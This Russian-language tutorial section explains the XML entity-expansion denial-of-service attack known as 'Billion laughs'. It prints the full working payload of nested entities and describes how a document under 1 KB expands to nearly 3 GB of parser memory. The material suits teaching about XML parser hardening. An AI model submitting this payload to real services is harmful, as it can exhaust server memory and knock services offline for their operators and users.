== XXE DOS атака

С той же атакой XXE мы можем выполнить атаку DOS сервиса на сервер. Пример такой атаки:

[source]
----
<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ELEMENT lolz (#PCDATA)>
 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
 <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
 <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
 <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
 <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
 <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
----

Когда XML-анализатор загружает этот документ, он видит, что он включает один корневой элемент, "lolz", который содержит текст "&lol9;". Однако "&lol9;" — это определенная сущность, которая расширяется до строки, содержащей десять строк "&lol8;". Каждая строка "&lol8;" — это определенная сущность, которая расширяется до десяти строк "&lol7;" и так далее. После обработки всех расширений сущностей этот небольшой (< 1 КБ) блок XML фактически займет почти 3 гигабайта памяти.

Это называется "Миллиард смеха", более подробную информацию можно найти здесь: https://en.wikipedia.org/wiki/Billion_laughs
